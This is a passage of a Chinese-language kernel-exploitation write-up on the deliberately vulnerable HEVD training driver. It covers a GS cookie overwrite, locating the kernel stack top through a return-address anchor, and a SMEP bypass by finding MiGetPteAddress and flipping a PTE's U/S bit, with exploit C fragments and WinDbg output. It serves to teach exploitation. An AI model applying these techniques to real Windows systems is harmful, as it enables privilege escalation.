@@ -1,0 +1,147 @@
+        //ULONGLONG hevdDataSection = hevdBaseAddr + hevdDataSecOffset;
+        printf("[+] hevdDataSection is 0x%I64x\n", dataBase);
+        // 修改 .data 段的 cookie 值
+        ULONGLONG newCookie = 0x0000414141414141;
+        BOOL status = WriteData(dataBase, newCookie);
+        if (status == FALSE) {
+            printf("[-] FATAL writing newCookie at hevd data section\n");
+            return 0;
+        }
+        return newCookie;
+    }
+### 4.3.2 获取栈顶数值
+首先利用 `NtQuerySystemInformation` 函数获取当前进程的
+`PSYSTEM_EXTENDED_PROCESS_INFORMATION` 信息，该信息中包含了进程中每个线程的 StackBase 和
+StackLimit 信息，StackBase 表示栈的起始地址，StackLimit 表示栈范围内可分配的最小地址，由于栈空间是向下分配的，因此
+StackBase 的数值大于 StackLimit 的数值。该方法代码基本来自参考链接[8]所在项目和参考链接[1]，存在细节的修改。
+代码执行后得到StackBase = 0xffffed0993bb2000，StackLimit = 0xffffed0993bac000。
+确定栈范围之后，需要在该范围内找到一个不变的常量作为锚点，然后以此锚点的地址为基址，确定发生异或时和栈顶之间的偏移。在参考链接[1]中，使用的锚点是
+IOCTL_CODE，可以看一下系统执行到时 `HEVD!TriggerBufferOverflowStackGS` 时栈上的数据分布：
+    ffffed09`93bb1798 fffff800746866da HEVD!BufferOverflowStackGSIoctlHandler+0x1a 
+    ffffed09`93bb17a0 0000000000000010 
+    ffffed09`93bb17a8 0000000000050282 
+    ffffed09`93bb17b0 ffffed0993bb17c8 
+    ffffed09`93bb17b8 0000000000000018 
+    ffffed09`93bb17c0 0000000000000000 
+    ffffed09`93bb17c8 fffff80074685223 HEVD!IrpDeviceIoCtlHandler+0x1ab 
+    ffffed09`93bb17d0 ffffbc24a1f15c89 
+    ffffed09`93bb17d8 0000000000000000 
+    ffffed09`93bb17e0 fffff80074688300 HEVD! ?? ::NNGAKEGL::`string'
+    ffffed09`93bb17e8 0000000000222007 
+    ffffed09`93bb17f0 ffff880648758680 
+    ffffed09`93bb17f8 fffff800724316b5 nt!IofCallDriver+0x55
+IOCTL_CODE `0000000000222007` 确实位于栈上，而且这个数据是在执行 `HEVD!IrpDeviceIoCtlHandler`
+的时候被放到栈上的，经过调试发现，该数值之所以出现在栈上，是因为在 `HEVD!IrpDeviceIoCtlHandler` 函数中调用
+`DbgPrintEx` 函数的时候对上下文进行保存，对保存了 IOCTL_CODE 的寄存器也进行了保存。
+当然实际用于锚点的并不是 `0000000000222007`，而是 `000000000022200B`，这是任意写漏洞所在函数的
+IOCTL_CODE，因为在搜索栈数据时，栈溢出漏洞所在函数并没有被调用，所以它的控制码是不会出现在栈上的，而为了搜索栈，需要调用任意写漏洞所在函数，所以它的控制码会出现在栈中，同时由于：
+  * 只有我们的漏洞利用程序在使用 HEVD.sys 这个驱动，每次只触发其中的一个 handler； 
+  * 不同 handler 的调用结构相似，都会在之前调用 `DbgPrintEx`。
+所以每次触发不同 handler 之后栈中数据分布相同，而且都存在对应 handler 的 IOCTL_CODE。
+但是我发现上面的条件实在是有些严苛，尤其是第二点，实际环境中无法保证 IOCTL_CODE 一定会被压入栈中，因此我考虑使用一个更常见的锚点——返回地址。
+通过查看函数调用栈可以发现，每次触发驱动的 handler 函数时，一定会调用 `nt!NtDeviceIoControlFile` 函数，并且返回地址在
+`nt!NtDeviceIoControlFile+0x56`。
+  * Q: 为什么没有选择距离更近的 __`nt!IofCallDriver` __ 函数？
+  * A: 因为需要在函数机器码中搜索 call 指令来确定返回地址（没有直接使用偏移量0x56），在 __`nt!IofCallDriver` __ 中，call 指令机器码 0xE8 之前还存在其他 0xE8，搜索不方便，因此选择 __`nt!NtDeviceIoControlFile` __ 函数。
+这个返回地址可以在 exploit
+中通过代码获得，同时我想即便在实际的漏洞环境中，通过增加执行次数、寻找时机等方式也能够实现类似条件一的环境，因此使用返回地址作为锚点的方式通用性会好一些。
+首先验证此方法的可行性：
+    1: kd> g
+    Breakpoint 0 hit
+    HEVD!TriggerArbitraryWrite:
+    fffff800`74685e74 488bc4          mov     rax,rsp
+    0: kd> kb
+     # RetAddr               : Args to Child                                                           : Call Site
+    00 fffff800`74685e6f     : ffffed09`92d337e8 00000000`00000001 00000000`00000000 fffff800`7280a621 : HEVD!TriggerArbitraryWrite 
+    01 fffff800`746851f3     : ffffbc24`a0997c89 00000000`00000000 fffff800`74688340 00000000`0022200b : HEVD!ArbitraryWriteIoctlHandler+0x17
+    02 fffff800`724316b5     : ffff8806`4609f780 00000000`00000002 00000000`00000001 ffff8806`469af190 : HEVD!IrpDeviceIoCtlHandler+0x17b
+    03 fffff800`7281d4c8     : ffffed09`92d33b80 ffff8806`4609f780 00000000`00000001 ffff8806`00000000 : nt!IofCallDriver+0x55
+    04 fffff800`7281d2c7     : ffff8806`00000000 ffffed09`92d33b80 00000000`00000000 ffffed09`92d33b80 : nt!IopSynchronousServiceTail+0x1a8
+    05 fffff800`7281c646     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0xc67
+    06 fffff800`72611ab5     : 00000000`000000a4 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtDeviceIoControlFile+0x56
+    07 00007ffb`0196d1a4     : 00007ffa`ff01572b 00000000`00000000 00002032`98fecb16 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25
+    08 00007ffa`ff01572b     : 00000000`00000000 00002032`98fecb16 00000000`00000000 00007ffb`018e6777 : 0x00007ffb`0196d1a4
+    09 00000000`00000000     : 00002032`98fecb16 00000000`00000000 00007ffb`018e6777 0000005c`ec6ff450 : 0x00007ffa`ff01572b
+    0: kd> s rsp L1000 46 c6 81 72 00 f8 ff ff
+    ffffed09`92d33a18  46 c6 81 72 00 f8 ff ff-00 00 00 00 00 00 00 00  F..r............
+    0: kd> g
+    Breakpoint 1 hit
+    HEVD!TriggerBufferOverflowStackGS:
+    fffff800`746866e0 48895c2418      mov     qword ptr [rsp+18h],rbx
+    2: kd> kb
+     # RetAddr               : Args to Child                                                           : Call Site
+    00 fffff800`746866da     : 00000000`00000010 00000000`00050282 ffffed09`92d337c8 00000000`00000018 : HEVD!TriggerBufferOverflowStackGS [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 70] 
+    01 fffff800`74685223     : ffffbc24`a0997c89 00000000`00000000 fffff800`74688300 00000000`00222007 : HEVD!BufferOverflowStackGSIoctlHandler+0x1a [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 148] 
+    02 fffff800`724316b5     : ffff8806`44eca820 00000000`00000002 00000000`00000001 ffff8806`469b02c0 : HEVD!IrpDeviceIoCtlHandler+0x1ab [c:\projects\hevd\driver\hevd\hacksysextremevulnerabledriver.c @ 282] 
+    03 fffff800`7281d4c8     : ffffed09`92d33b80 ffff8806`44eca820 00000000`00000001 ffff8806`00000000 : nt!IofCallDriver+0x55
+    04 fffff800`7281d2c7     : ffff8806`00000000 ffffed09`92d33b80 00000000`00000000 ffffed09`92d33b80 : nt!IopSynchronousServiceTail+0x1a8
+    05 fffff800`7281c646     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0xc67
+    06 fffff800`72611ab5     : ffffed09`92d33b80 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtDeviceIoControlFile+0x56
+    07 00007ffb`0196d1a4     : 00007ffa`ff01572b 00000000`00000000 00002032`98feca86 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25
+    08 00007ffa`ff01572b     : 00000000`00000000 00002032`98feca86 00000000`00000000 00007ffb`018e6777 : 0x00007ffb`0196d1a4
+    09 00000000`00000000     : 00002032`98feca86 00000000`00000000 00007ffb`018e6777 0000005c`ec6ff4c0 : 0x00007ffa`ff01572b
+    2: kd> s rsp L1000 46 c6 81 72 00 f8 ff ff
+    ffffed09`92d33a18  46 c6 81 72 00 f8 ff ff-00 00 00 00 00 00 00 00  F..r............
+    3: kd> p
+    HEVD!TriggerBufferOverflowStackGS+0x1b:
+    fffff800`746866fb 4833c4          xor     rax,rsp
+    3: kd> r rsp
+    rsp=ffffed0992d33540
+可以发现在触发这两个 handler 函数时，作为锚点的返回地址位于栈中的相同位置，而计算 xored_security_cookie 的栈顶地址为
+`ffffed0992d33540`，和锚点的偏移是 0x4D8。因此只需要找到锚点，然后减去 0x4D8 就可以获得 RSP 的数值了。
+## 4.4 SMEP 绕过
+### 4.4.1 如何获得 PTE 地址
+内核中存在一个 `MiGetPteAddress` 函数，输入参数为虚拟地址，返回值是地址对应的 PTE 地址，该函数如下：
+    unsigned __int64 __fastcall MiGetPteAddress(unsigned __int64 va)
+    {
+      return ((va >> 9) & 0x7FFFFFFFF8i64) + 0xFFFFF68000000000ui64;
+    }
+注意其中的数值 `0xFFFFF68000000000ui64`，这就是 PTE 的基地址，但是由于随机化的原因，这个地址在使用 Windbg
+动态反编译时就发生了改变：
+    3: kd> uf nt!MiGetPteAddress
+    nt!MiGetPteAddress:
+    fffff805`05af5f10 48c1e909              shr     rcx,9
+    fffff805`05af5f14 48b8f8ffffff7f000000  mov rax,7FFFFFFFF8h
+    fffff805`05af5f1e 4823c8                and     rcx,rax
+    fffff805`05af5f21 48b80000000000a2ffff  mov rax,0FFFFA20000000000h
+    fffff805`05af5f2b 4803c1                add     rax,rcx
+    fffff805`05af5f2e c3                    ret
+最好的方法是调用这个函数得到 PTE 地址，但是这并不是一个导出函数，因此需要想办法获取到 `MiGetPteAddress` 函数的地址，然后在偏移
+0x13 的位置读取到 PTE 的基地址，使用 `MiGetPteAddress` 函数中的计算方法得到 PTE 地址。
+有两种方法可以获取到 `MiGetPteAddress` 函数的地址：
+1.在内核代码段搜索函数的 signature
+我使用计算函数 signature 的方法在 ntoskrnl.exe 的 .text 段中进行搜索，signature
+的计算方式沿用了参考资料[6]中的方法，但是在定位 .text 段时采用的不同的方式，原因可以看下面的 **知识点积累** 。
+2.在调用函数中搜索 call 指令
+该方法来自参考资料[8]，本来是用来搜索 `HMValidateHandle` 函数的地址，从而泄露内核地址，可以使用同样的方法找到
+`MiGetPteAddress` 函数的地址，在引用 `MiGetPteAddress` 的函数中找到导出函数
+`MmLockPreChargedPagedPool`，这个函数很短，而且在进入函数不久就调用了 `MiGetPteAddress`：
+                                   public MmLockPreChargedPagedPool
+                                   MmLockPreChargedPagedPool proc near
+     48 83 EC 28                   sub     rsp, 28h
+     4C 8B C1                      mov     r8, rcx
+     E8 24 2D B7 FF                call    MiGetPteAddress
+     48 8D 8A FF 0F 00 00          lea     rcx, [rdx+0FFFh]
+     41 81 E0 FF 0F 00 00          and     r8d, 0FFFh
+     49 03 C8                      add     rcx, r8
+     41 B9 01 00 00 00             mov     r9d, 1
+     48 C1 E9 0C                   shr     rcx, 0Ch
+     48 8B D0                      mov     rdx, rax
+     48 FF C9                      dec     rcx
+     4C 8D 04 C8                   lea     r8, [rax+rcx*8]
+     33 C9                         xor     ecx, ecx
+     E8 A8 7E B4 FF                call    MiLockCode
+     48 83 C4 28                   add     rsp, 28h
+     C3                            retn
+然后搜索机器码 `E8` 就能获得 `MiGetPteAddress` 的地址了。
+### 4.4.2 修改 U/S 字段
+在 [X64 分页机制](https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g) 中介绍了 PTE
+的结构如下：
+    | |   62:52   |          51:12          |          11:0         |
+    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    |X|           |                         | | | | |P| | |P|P|U|R| |
+    |D|     i     |           PFN           |i|i|i|G|A|D|A|C|W|/|/|P|
+    | |           |                         | | | | |T| | |D|T|S|W| |
+    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+U/S 字段位于第 2 位，只需要与 0x4 进行异或就能实现 U/S 字段的修改。
+    BOOL ChangeUS(ULONGLONG pteAddr) {
